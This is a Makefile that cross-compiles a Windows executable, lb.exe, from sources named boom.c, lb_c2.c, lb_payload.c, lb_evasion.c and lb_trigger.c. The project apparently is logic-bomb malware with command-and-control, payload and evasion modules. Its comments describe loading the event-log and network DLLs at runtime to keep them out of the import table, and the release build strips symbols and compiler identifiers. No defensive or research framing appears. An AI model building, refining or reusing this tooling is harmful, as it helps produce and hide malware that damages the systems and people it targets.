# ============================================================
# Makefile — logic_boo full build
# Compiler : MinGW-w64 gcc (cross-compile from Linux/macOS)
#            or native MinGW-w64 gcc on Windows
# Target   : Windows 7+ x64 (PE32+)
# Output   : build/lb.exe
#
# Usage:
#   make             — debug build (keeps symbols, no strip)
#   make release     — optimised, stripped, no debug info
#   make clean       — remove build/ entirely
#   make check       — verify all required source files are present
#
# Cross-compile from Linux (install: sudo apt install mingw-w64):
#   make CC=x86_64-w64-mingw32-gcc
#
# Cross-compile from macOS (install: brew install mingw-w64):
#   make CC=x86_64-w64-mingw32-gcc
#
# Native Windows MinGW-w64:
#   make   (CC defaults to gcc)
#
# GOTCHAS:
#   - BCrypt   : -lbcrypt  (Windows 7+ — always present)
#   - Wevtapi  : NOT linked statically; loaded at runtime by lb_trigger.c
#                via LoadLibraryA("wevtapi.dll") — no -lwevtapi needed.
#   - Netapi32 : NOT linked statically; loaded at runtime by lb_trigger.c
#                via LoadLibraryA("netapi32.dll") — no -lnetapi32 needed.
#   - -lntdll  : required by lb_evasion.c NT* typedefs; ships with
#                MinGW-w64 by default.  If ld complains, add the WDK
#                import lib path: -L/path/to/wdk/lib/um/x64
#   - -static-libgcc / -static-libstdc++ : bundle the runtime so the
#     binary runs on targets that don't have MinGW runtime DLLs.
#   - ASLR + DEP : enabled via --dynamicbase --nxcompat in LDFLAGS.
#   - Manifest   : embedded to request asInvoker execution level.
# ============================================================

# ── Toolchain ────────────────────────────────────────────────
CC      := gcc
WINDRES := windres
STRIP   := strip

# ── Directories ──────────────────────────────────────────────
SRC_DIR   := .
BUILD_DIR := build

# ── Output ───────────────────────────────────────────────────
TARGET := $(BUILD_DIR)/lb.exe

# ── Sources ──────────────────────────────────────────────────
# List all .c translation units explicitly — no glob, so a stray
# .c file dropped in the directory can't accidentally join the build.
SOURCES := \
    $(SRC_DIR)/boom.c        \
    $(SRC_DIR)/lb_c2.c       \
    $(SRC_DIR)/lb_payload.c  \
    $(SRC_DIR)/lb_evasion.c  \
    $(SRC_DIR)/lb_trigger.c

OBJECTS := $(patsubst $(SRC_DIR)/%.c, $(BUILD_DIR)/%.o, $(SOURCES))

# ── Headers (used as dependency for all objects) ──────────────
HEADERS := \
    $(SRC_DIR)/lb_c2.h       \
    $(SRC_DIR)/lb_evasion.h  \
    $(SRC_DIR)/lb_trigger.h

# ── Compiler flags ────────────────────────────────────────────
CFLAGS_COMMON := \
    -std=c11                  \
    -Wall                     \
    -Wextra                   \
    -Wno-unused-parameter     \
    -Wno-pedantic-ms-format   \
    -D_WIN32_WINNT=0x0601     \
    -DWIN32_LEAN_AND_MEAN     \
    -m64

# Debug build (default)
CFLAGS_DEBUG   := $(CFLAGS_COMMON) -O0 -g -DDEBUG

# Release build (make release)
CFLAGS_RELEASE := $(CFLAGS_COMMON) -O2 -ffunction-sections -fdata-sections \
                  -fno-ident -DNDEBUG

# Active flags (overridden by 'make release')
CFLAGS := $(CFLAGS_DEBUG)

# ── Preprocessor ─────────────────────────────────────────────
CPPFLAGS := -I$(SRC_DIR)

# ── Linker flags ─────────────────────────────────────────────
LDFLAGS_COMMON := \
    -m64                          \
    -Wl,--dynamicbase             \
    -Wl,--nxcompat                \
    -Wl,--high-entropy-va         \
    -Wl,--gc-sections             \
    -static-libgcc                \
    -mwindows

# Debug: keep symbols
LDFLAGS_DEBUG   := $(LDFLAGS_COMMON)

# Release: strip everything
LDFLAGS_RELEASE := $(LDFLAGS_COMMON) -Wl,--strip-all

# Active flags
LDFLAGS := $(LDFLAGS_DEBUG)

# ── Libraries ─────────────────────────────────────────────────
# wevtapi and netapi32 are intentionally absent — lb_trigger.c
# loads them at runtime to avoid static import-table entries.
LDLIBS := \
    -lws2_32    \
    -ladvapi32  \
    -lshell32   \
    -lgdi32     \
    -luser32    \
    -lbcrypt    \
    -lntdll

# ── Phony targets ─────────────────────────────────────────────
.PHONY: all release clean check

# ── Default: debug build ──────────────────────────────────────
all: check $(TARGET)
	@echo ""
	@echo "  [OK] Debug build: $(TARGET)"
	@echo "       Size: $$(wc -c < $(TARGET)) bytes"

# ── Release build ─────────────────────────────────────────────
release: CFLAGS  := $(CFLAGS_RELEASE)
release: LDFLAGS := $(LDFLAGS_RELEASE)
release: check $(TARGET)
	$(STRIP) --strip-all $(TARGET)
	@echo ""
	@echo "  [OK] Release build: $(TARGET)"
	@echo "       Size after strip: $$(wc -c < $(TARGET)) bytes"

# ── Link ──────────────────────────────────────────────────────
$(TARGET): $(OBJECTS) | $(BUILD_DIR)
	$(CC) $(LDFLAGS) $^ $(LDLIBS) -o $@

# ── Compile each .c → .o ─────────────────────────────────────
# All objects depend on all headers so any header change rebuilds everything.
$(BUILD_DIR)/%.o: $(SRC_DIR)/%.c $(HEADERS) | $(BUILD_DIR)
	$(CC) $(CPPFLAGS) $(CFLAGS) -c $< -o $@

# ── Create build dir if absent ────────────────────────────────
$(BUILD_DIR):
	mkdir -p $(BUILD_DIR)

# ── Source-file check ─────────────────────────────────────────
# Fails loudly if a required file is absent — catches copy/paste mistakes
# before the compiler has a chance to produce a confusing error.
REQUIRED_SRC := boom.c lb_c2.c lb_payload.c lb_evasion.c lb_trigger.c
REQUIRED_HDR := lb_c2.h lb_evasion.h lb_trigger.h

check:
	@echo "Checking required source files..."
	@for f in $(REQUIRED_SRC); do \
	    test -f $(SRC_DIR)/$$f || \
	        { echo "  ERROR: missing source: $(SRC_DIR)/$$f"; exit 1; }; \
	    echo "  OK  $$f"; \
	done
	@for h in $(REQUIRED_HDR); do \
	    test -f $(SRC_DIR)/$$h || \
	        { echo "  ERROR: missing header: $(SRC_DIR)/$$h"; exit 1; }; \
	    echo "  OK  $$h"; \
	done
	@echo "All required files present."

# ── Clean ─────────────────────────────────────────────────────
clean:
	rm -rf $(BUILD_DIR)
	@echo "Cleaned."